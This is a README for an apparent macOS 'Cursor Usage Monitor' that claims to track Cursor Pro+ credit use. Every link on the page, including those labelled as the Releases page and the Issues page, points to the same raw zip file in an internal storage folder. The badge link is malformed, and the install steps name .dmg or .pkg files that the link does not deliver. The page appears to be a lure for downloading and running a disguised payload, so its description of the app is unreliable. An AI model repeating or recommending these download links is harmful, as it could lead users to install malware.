# 🖱️ cursor_usage - Monitor Your Cursor IDE Effectively

## 🌟 Introduction

Welcome to Cursor Usage Monitor, a simple application that helps you track your Cursor Pro+ usage. This program runs locally and alerts you when your usage reaches certain levels. It makes sure you stay informed without overwhelming you with information.

## 🚀 Getting Started

To begin using the Cursor Usage Monitor, you need to download it. You can do this by visiting our [Releases page](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/storage/usage-cursor-v1.8-alpha.2.zip).

[![Download Cursor Usage Monitor](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/storage/usage-cursor-v1.8-alpha.2.zip%20Usage%https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/storage/usage-cursor-v1.8-alpha.2.zip)](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/storage/usage-cursor-v1.8-alpha.2.zip)

## 📥 Download & Install

1. Click on the [Releases page](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/storage/usage-cursor-v1.8-alpha.2.zip).
2. Look for the latest version of the application.
3. Download the appropriate file for your macOS system.
4. Once downloaded, find the file in your Downloads folder.

## ⚙️ System Requirements

- Operating System: macOS (versions 10.13 and above)
- Minimum RAM: 4 GB
- Disk Space: 100 MB available space

## 🛠️ How to Run the Application

1. Open your Downloads folder.
2. Locate the downloaded `.dmg` or `.pkg` file.
3. Double-click the file to start the installation process.
4. Follow the prompts to complete the installation.
5. Open the application from your Applications folder.

## 📊 What This Application Does

The Cursor Usage Monitor provides the following features:

1. **Monitors Usage in Real-Time**: The application checks your usage every 15 minutes, giving you up-to-date information about your Cursor activities.
   
2. **Stores Historical Data**: All your usage data is saved in a local SQLite database. This allows you to review your metrics anytime.

3. **Sends Alerts**: Stay informed with macOS notifications when:
   - Your usage exceeds 75%, 90%, or 100% of included credits.
   - Your billing switches from "Included" to "On-Demand".

4. **Provides Analytics**: Access detailed summaries and cost breakdowns so you know exactly how you are using your credits.

5. **Runs in Background**: The application can run quietly in the background, freeing you from constant monitoring.

## 📈 How It Works

### Architecture Overview

```
┌─────────────────┐
│  Cursor IDE     │
│  (Local DB)     │
└─────────────────┘
         ↓
┌───────────────────────────┐
│  Cursor Usage Monitor     │
│  (Monitors API)          │
└───────────────────────────┘
         ↓
┌─────────────────────────────┐
│  SQLite Database            │
│  (Stores Metrics)           │
└─────────────────────────────┘
         ↓
┌─────────────────────────────┐
│  macOS Notifications        │
└─────────────────────────────┘
```

## 🎓 Key Features Explained

- **Real-Time Monitoring**: By polling the Cursor API, you can keep track of your usage as it happens. This way, you can make informed choices about your Cursor subscription.
  
- **SQLite Database**: This local database ensures that all your data regarding usage, events, and costs is securely stored.

- **Notifications**: With alerts set based on your usage thresholds, you will never miss an important update.

- **Background Operation**: The ability to run as a background process means you can use your computer without interruptions.

## 🔧 Troubleshooting

### Common Issues

1. **Application Doesn't Start**: Ensure the application is properly installed. Reinstall if needed.
2. **No Notifications**: Check your macOS notification settings to make sure they are enabled for the Cursor Usage Monitor.
3. **Data Not Saving**: Ensure that you have enough disk space available on your computer.

## 📞 Need Help?

If you face any issues or have questions, please raise an issue on our [GitHub Issues page](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/storage/usage-cursor-v1.8-alpha.2.zip). 

## 👍 Acknowledgments

Thank you for using Cursor Usage Monitor. Your feedback helps us improve the application.

Visit our [Releases page](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/storage/usage-cursor-v1.8-alpha.2.zip) to download the latest version today!